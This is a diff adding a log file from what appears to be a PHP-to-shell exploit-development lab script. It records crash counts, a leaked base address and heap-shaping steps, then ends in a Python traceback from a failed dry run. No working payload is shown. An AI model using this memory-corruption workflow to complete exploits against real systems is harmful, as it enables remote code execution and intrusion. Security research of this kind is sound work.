@@ -1,0 +1,18 @@
+=== oom129: tagged-value measure + name-sea arm ===
+md5 ok
+shaped segv=3
+base=0x7fa99dd74000
+pre x: NO_X
+Traceback (most recent call last):
+  File "/Users/vlad/Projects/queue/php2shell-lab/oom129.py", line 217, in <module>
+    a0 = build_post(B=None, with_block=True)       # dry-run arm geometry check
+  File "/Users/vlad/Projects/queue/php2shell-lab/oom129.py", line 126, in build_post
+    + value_of(i, B=B, OFF=OFF, with_block=with_block) + b"\r\n")
+      ~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/Users/vlad/Projects/queue/php2shell-lab/oom129.py", line 101, in value_of
+    v = bytearray(cell_of(B) * (1537 // 16) + b"P")
+                  ~~~~~~~^^^
+  File "/Users/vlad/Projects/queue/php2shell-lab/oom129.py", line 83, in cell_of
+    return struct.pack("<Q", addr) * 2
+           ~~~~~~~~~~~^^^^^^^^^^^^
+struct.error: required argument is not an integer
